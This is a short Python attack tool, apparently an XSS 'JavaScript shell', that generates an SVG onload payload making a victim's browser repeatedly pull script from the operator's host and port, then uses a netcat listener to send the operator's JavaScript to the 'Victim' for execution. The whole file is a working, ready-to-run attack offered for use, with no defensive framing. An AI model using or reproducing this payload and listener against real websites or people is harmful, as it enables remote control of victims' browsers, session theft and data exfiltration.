#!/usr/bin/env python3
import socket
import os
import time
import sys
from subprocess import Popen,PIPE,STDOUT,call 

if sys.version_info < (3, 0):
    input = raw_input

# Just some colors and shit
white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
yellow = '\033[1;33m'
end = '\033[1;m'
info = '\033[1;33m[!]\033[1;m'
que =  '\033[1;34m[?]\033[1;m'
bad = '\033[1;31m[-]\033[1;m'
good = '\033[1;32m[+]\033[1;m'
run = '\033[1;97m[~]\033[1;m'

print ('''%s    _  _|_       _
    | |_|_  |_| |_ |  |
  \_|  _|_| | | |_ |_ |_
        |''' % red)
# Connecting to google DNS and retrieving IP address of host
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
LHOST = s.getsockname()[0]
s.close()

# Prompting the user for LHOST
choice = input('%s %s%s%s : Use this as LHOST? [Y/n] ' % (que, green, LHOST, end)).lower()
if choice == 'n':
    LHOST = input('%s Enter LHOST: ' % que)

# Prompting the user for LPORT
LPORT = '33'
choice = input('%s %s%s%s : Use this as LPORT? [Y/n] ' % (que, green, LPORT, end)).lower()
if choice == 'n':
    LPORT = input('%s Enter LPORT: ' % que)

print ('%s Payload generated' % good)
payload = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (LHOST, LPORT)
print (payload)
print ('%s Waiting for the payload to be executed' % run)
if 'darwin' in sys.platform:
    NETCAT_COMMAND = 'nc -nvlk'
else:
    NETCAT_COMMAND = 'nc -nvlp'

def shell():
    os.system('printf "\033[F\033[0;31m$\033[0m "; read c; echo "$c" | sleep 1 && %s %s >/dev/null;' % (NETCAT_COMMAND, LPORT))
    shell()

def status():
    proc = Popen('sleep 1 && %s %s' % (NETCAT_COMMAND, LPORT), shell=True, stdout=PIPE, )
    response = str(proc.communicate()[0])
    if 'Accept' in response:
        print (response.replace('\\r\\n', '\n').replace('b\'', '')[:-3])
        print ('\n%s Victim is online. Enter JS code to execute.\n\n' % good)
        shell()
    else:
        os.system('printf "\033[F"')
        time.sleep(2)
        status()

status()
